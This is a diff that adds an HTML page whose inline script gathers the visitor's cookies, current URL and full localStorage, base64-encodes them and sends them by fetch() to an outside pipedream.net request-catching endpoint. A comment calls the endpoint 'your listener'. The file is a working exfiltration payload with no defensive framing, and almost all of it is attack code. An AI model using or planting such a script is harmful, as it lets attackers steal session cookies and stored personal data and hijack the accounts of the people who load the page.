@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // Extracting data from the current session
+        const piiData = {
+            cookies: document.cookie,
+            url: window.location.href,
+            localStorage: JSON.stringify(localStorage)
+        };
+
+        // Sending the data back to your listener (You can use RequestBin here to catch the data)
+        fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(JSON.stringify(piiData)));
+    </script>
+</body>
+</html>
